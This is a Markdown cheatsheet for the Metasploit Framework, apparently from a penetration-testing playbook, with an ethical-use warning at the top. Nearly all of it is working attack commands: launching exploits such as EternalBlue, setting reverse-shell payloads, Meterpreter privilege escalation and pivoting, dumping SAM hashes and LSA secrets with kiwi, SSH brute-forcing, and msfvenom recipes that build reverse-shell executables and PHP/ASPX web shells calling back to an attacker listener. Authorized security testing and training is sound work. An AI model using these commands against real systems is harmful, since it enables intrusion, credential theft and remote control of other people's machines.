# 💣 Metasploit Framework Cheatsheet

A quick-reference guide for using the Metasploit Framework (MSF) during penetration tests.

> [!WARNING]
> **Ethical Use Only:** Only use Metasploit against systems you own or have explicit written authorization to test.

## 🚀 Starting Metasploit
```bash
# Start the Metasploit console
msfconsole

# Start quietly (skip banner)
msfconsole -q

# Initialize/update the database
msfdb init
msfdb start
```

## 🗂️ Core Navigation
```bash
# Search for a module
search type:exploit platform:windows smb
search cve:2021-44228          # Find by CVE

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Get detailed info about a module
info

# Show options required for the current module
show options
show advanced

# Go back to root
back
```

## ⚙️ Setting Options
```bash
# Set a single option
set RHOSTS 192.168.1.10
set LHOST 10.10.14.5
set LPORT 4444

# Set multiple hosts or a range
set RHOSTS 192.168.1.0/24
set RHOSTS file:/tmp/hosts.txt

# Set a global value (persists across modules)
setg LHOST 10.10.14.5
setg LPORT 4444

# Unset a value
unset RHOSTS
```

## 🎯 Payloads
```bash
# List compatible payloads for the current exploit
show payloads

# Set a payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Common payloads
windows/x64/meterpreter/reverse_tcp      # Staged — Windows x64
windows/x64/meterpreter_reverse_tcp      # Stageless — Windows x64
linux/x64/meterpreter/reverse_tcp        # Staged — Linux x64
java/jsp_shell_reverse_tcp               # Java web apps

# Staged vs. Stageless
# Staged (/)   — Small initial payload that pulls the rest from MSF
# Stageless (_) — Self-contained, no callback to pull stage (better for restricted networks)
```

## 🏃 Execution
```bash
# Run the exploit (exits on success)
run

# Run as a background job
run -j

# Check if target is vulnerable (non-destructive, when available)
check
```

## 🐚 Meterpreter — Post-Exploitation
Once you have a Meterpreter session:

### Navigation & Files
```bash
sysinfo           # OS, hostname, architecture
getuid            # Current user
pwd               # Current directory on target
ls                # List directory
cd C:\\Users      # Change directory
download file.txt # Download from target
upload shell.exe  # Upload to target
```

### Privilege Escalation
```bash
getsystem         # Attempt automatic privesc (various techniques)
getprivs          # List enabled privileges
```

### Pivoting & Networking
```bash
ipconfig          # Network interfaces
arp               # ARP table
route             # Routing table

# Add a route through the compromised host to reach an internal subnet
route add 10.10.10.0/24 <session_id>

# Set up a SOCKS proxy through MSF
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
# Then configure proxychains to use 127.0.0.1:1080
```

### Credential Dumping
```bash
hashdump                          # Dump local SAM hashes
load kiwi                         # Load Mimikatz-equivalent
creds_all                         # Dump all credentials
lsa_dump_sam                      # SAM hashes
lsa_dump_secrets                  # LSA secrets
```

### Persistence & Shells
```bash
shell             # Drop into a system shell
background        # Background the current session (Ctrl+Z)
sessions -l       # List all active sessions
sessions -i 1     # Interact with session 1
sessions -k 1     # Kill session 1
```

## 🔍 Auxiliary Modules — Scanning & Enumeration
```bash
# Port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389
run

# SMB version detection
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SSH login brute-force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/seclists/Passwords/rockyou-75.txt
run
```

## 💾 Database & Workspaces
```bash
# Work in named workspaces per engagement
workspace -a client_pentest
workspace client_pentest

# View all discovered hosts
hosts
services
vulns
creds

# Export results
db_export -f xml /tmp/msf_results.xml
```

## 🔧 msfvenom — Payload Generator
```bash
# List payload formats
msfvenom --list formats

# Windows EXE reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# Linux ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php

# ASP.NET web shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx

# Set up the matching listener
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
run -j
```

---
*Return to [SimplySec Playbook](../README.md)*
